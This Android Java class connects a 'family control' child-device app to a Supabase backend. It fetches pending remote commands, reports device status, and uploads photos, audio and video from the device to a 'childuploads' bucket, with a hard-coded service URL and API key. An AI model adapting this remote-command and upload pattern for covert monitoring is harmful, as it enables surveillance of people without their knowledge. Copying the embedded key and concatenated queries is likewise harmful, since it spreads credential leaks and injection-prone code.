package com.familycontrol.child;

import android.content.Context;
import android.util.Log;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class SupabaseClient {
    
    private static final String TAG = "SupabaseClient";
    private static final String SUPABASE_URL = "https://khrvclduqmuqmohfkrso.supabase.co";
    private static final String SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtocnZjbGR1cW11cW1vaGZrcnNvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTI5MzA0MTIsImV4cCI6MjA2ODUwNjQxMn0.fOs-pV9FFsyxfUSNqBneqnxUQfqB1u6XIRCNQM2AWcc";
    private static final String STORAGE_BUCKET = "childuploads";
    
    private Context context;
    
    public SupabaseClient(Context context) {
        this.context = context;
    }
    
    public String getPendingCommands(String deviceId) {
        try {
            String endpoint = "/rest/v1/commands?device_id=eq." + deviceId + "&status=eq.pending&order=created_at.asc";
            return makeGetRequest(endpoint);
        } catch (Exception e) {
            Log.e(TAG, "Error getting pending commands", e);
            return null;
        }
    }
    
    public boolean markCommandExecuted(String commandType) {
        try {
            String endpoint = "/rest/v1/commands?command_type=eq." + commandType + "&status=eq.pending";
            String jsonData = "{\"status\":\"executed\",\"executed_at\":\"" + getCurrentTimestamp() + "\"}";
            return makePatchRequest(endpoint, jsonData);
        } catch (Exception e) {
            Log.e(TAG, "Error marking command executed", e);
            return false;
        }
    }
    
    public boolean updateDeviceStatus(String deviceId, boolean isOnline) {
        try {
            String endpoint = "/rest/v1/status";
            String jsonData = "{"
                + "\"device_id\":\"" + deviceId + "\","
                + "\"is_online\":" + isOnline + ","
                + "\"last_seen\":\"" + getCurrentTimestamp() + "\","
                + "\"updated_at\":\"" + getCurrentTimestamp() + "\""
                + "}";
            
            // Try to update first, if fails, insert
            String updateEndpoint = "/rest/v1/status?device_id=eq." + deviceId;
            if (!makePatchRequest(updateEndpoint, jsonData)) {
                return makePostRequest(endpoint, jsonData);
            }
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error updating device status", e);
            return false;
        }
    }
    
    public boolean uploadFile(String fileName, String filePath, String fileType) {
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                Log.e(TAG, "File does not exist: " + filePath);
                return false;
            }
            
            String storagePath = System.currentTimeMillis() + "_" + fileName;
            String uploadUrl = SUPABASE_URL + "/storage/v1/object/" + STORAGE_BUCKET + "/" + storagePath;
            
            HttpURLConnection connection = (HttpURLConnection) new URL(uploadUrl).openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("apikey", SUPABASE_ANON_KEY);
            connection.setRequestProperty("Authorization", "Bearer " + SUPABASE_ANON_KEY);
            connection.setRequestProperty("Content-Type", getMimeType(fileType));
            connection.setDoOutput(true);
            
            // Upload file data
            try (FileInputStream fis = new FileInputStream(file);
                 DataOutputStream dos = new DataOutputStream(connection.getOutputStream())) {
                
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    dos.write(buffer, 0, bytesRead);
                }
            }
            
            int responseCode = connection.getResponseCode();
            boolean success = responseCode == 200 || responseCode == 201;
            
            if (success) {
                // Record upload in database
                recordUpload(fileName, fileType, storagePath, file.length());
            }
            
            return success;
            
        } catch (Exception e) {
            Log.e(TAG, "Error uploading file", e);
            return false;
        }
    }
    
    private boolean recordUpload(String fileName, String fileType, String storagePath, long fileSize) {
        try {
            String endpoint = "/rest/v1/uploads";
            String jsonData = "{"
                + "\"device_id\":\"" + getDeviceId() + "\","
                + "\"file_name\":\"" + fileName + "\","
                + "\"file_type\":\"" + fileType + "\","
                + "\"file_size\":" + fileSize + ","
                + "\"storage_path\":\"" + storagePath + "\""
                + "}";
            
            return makePostRequest(endpoint, jsonData);
        } catch (Exception e) {
            Log.e(TAG, "Error recording upload", e);
            return false;
        }
    }
    
    private String makeGetRequest(String endpoint) throws Exception {
        URL url = new URL(SUPABASE_URL + endpoint);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        
        connection.setRequestMethod("GET");
        connection.setRequestProperty("apikey", SUPABASE_ANON_KEY);
        connection.setRequestProperty("Authorization", "Bearer " + SUPABASE_ANON_KEY);
        connection.setRequestProperty("Content-Type", "application/json");
        
        int responseCode = connection.getResponseCode();
        if (responseCode == 200) {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                return response.toString();
            }
        }
        
        return null;
    }
    
    private boolean makePostRequest(String endpoint, String jsonData) throws Exception {
        return makeRequest("POST", endpoint, jsonData);
    }
    
    private boolean makePatchRequest(String endpoint, String jsonData) throws Exception {
        return makeRequest("PATCH", endpoint, jsonData);
    }
    
    private boolean makeRequest(String method, String endpoint, String jsonData) throws Exception {
        URL url = new URL(SUPABASE_URL + endpoint);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        
        connection.setRequestMethod(method);
        connection.setRequestProperty("apikey", SUPABASE_ANON_KEY);
        connection.setRequestProperty("Authorization", "Bearer " + SUPABASE_ANON_KEY);
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setDoOutput(true);
        
        // Send JSON data
        try (DataOutputStream dos = new DataOutputStream(connection.getOutputStream())) {
            dos.write(jsonData.getBytes(StandardCharsets.UTF_8));
        }
        
        int responseCode = connection.getResponseCode();
        return responseCode >= 200 && responseCode < 300;
    }
    
    private String getCurrentTimestamp() {
        return java.time.Instant.now().toString();
    }
    
    private String getDeviceId() {
        try {
            return android.provider.Settings.Secure.getString(
                context.getContentResolver(), 
                android.provider.Settings.Secure.ANDROID_ID
            );
        } catch (Exception e) {
            return "device_" + System.currentTimeMillis();
        }
    }
    
    private String getMimeType(String fileType) {
        switch (fileType.toLowerCase()) {
            case "image":
                return "image/jpeg";
            case "audio":
                return "audio/mpeg";
            case "video":
                return "video/mp4";
            default:
                return "application/octet-stream";
        }
    }
}

